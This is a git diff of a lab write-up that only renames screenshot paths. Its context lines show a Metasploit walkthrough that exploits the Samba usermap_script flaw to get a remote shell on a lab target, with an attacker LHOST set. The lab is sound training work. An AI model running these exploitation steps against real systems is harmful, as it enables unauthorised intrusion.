@@ -48,7 +48,7 @@ These ports indicate SMB file-sharing services exposed to the network.
 
 <br>
 
-<img src="Screenshots/week5_1.png" width="800" alt="Nmap Scan">
+<img src="Screenshot/week5_1.png" width="800" alt="Nmap Scan">
 
 ---
 
@@ -71,7 +71,7 @@ This vulnerability exists because Samba improperly validates usernames in the us
 
 <br>
 
-<img src="Screenshots/week5_2.png" width="800" alt="Searchsploit Results">
+<img src="Screenshot/week5_2.png" width="800" alt="Searchsploit Results">
 
 ---
 
@@ -87,7 +87,7 @@ msfconsole
 
 <br>
 
-<img src="Screenshots/week5_3.png" width="800" alt="MSFConsole">
+<img src="Screenshot/week5_3.png" width="800" alt="MSFConsole">
 
 ### Search Exploit Module
 
@@ -97,7 +97,7 @@ search samba usermap
 
 <br>
 
-<img src="Screenshots/week5_4.png" width="800" alt="Search Module">
+<img src="Screenshot/week5_4.png" width="800" alt="Search Module">
 
 ### Select Module
 
@@ -107,7 +107,7 @@ use exploit/multi/samba/usermap_script
 
 <br>
 
-<img src="Screenshots/week5_5.png" width="800" alt="Use Exploit">
+<img src="Screenshot/week5_5.png" width="800" alt="Use Exploit">
 
 ### Show Options
 
@@ -117,7 +117,7 @@ show options
 
 <br>
 
-<img src="Screenshots/week5_6.png" width="800" alt="Show Options">
+<img src="Screenshot/week5_6.png" width="800" alt="Show Options">
 
 ### Configure Target & Attacker IP
 
@@ -128,7 +128,7 @@ set LHOST 192.168.254.128
 
 <br>
 
-<img src="Screenshots/week5_7.png" width="800" alt="Set Options">
+<img src="Screenshot/week5_7.png" width="800" alt="Set Options">
 
 ### Run Exploit
 
@@ -138,7 +138,7 @@ run
 
 <br>
 
-<img src="Screenshots/week5_8.png" width="800" alt="Run Exploit">
+<img src="Screenshot/week5_8.png" width="800" alt="Run Exploit">
 
 ---
 
@@ -160,7 +160,7 @@ This confirms successful remote shell access to the target.
 
 <br>
 
-<img src="Screenshots/week5_9.png" width="800" alt="Shell Access">
+<img src="Screenshot/week5_9.png" width="800" alt="Shell Access">
 
 ---
 
@@ -184,7 +184,7 @@ uname -a
 
 <br>
 
-<img src="Screenshots/week5_10.png" width="800" alt="Post Exploitation">
+<img src="Screenshot/week5_10.png" width="800" alt="Post Exploitation">
 
 ---
 
